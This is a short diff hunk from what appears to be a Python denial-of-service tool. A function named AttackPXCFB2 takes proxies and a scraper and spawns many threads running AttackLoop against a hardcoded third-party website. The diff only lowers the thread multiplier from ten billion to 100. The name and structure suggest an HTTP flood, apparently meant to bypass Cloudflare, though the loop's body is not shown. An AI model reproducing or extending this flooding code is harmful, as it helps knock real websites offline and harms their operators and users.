@@ -624,7 +624,7 @@ def AttackPXCFB2(url, until_datetime, scraper,proxies,th):
 
                 # Define the URL you want to scrape
                 url = 'https://xvideos68.com'
-                for _ in range(int(th)*10000000000):
+                for _ in range(int(th)*100):
                     thd = threading.Thread(target=AttackLoop, args=(driver,url))
                     thd.start()
                     
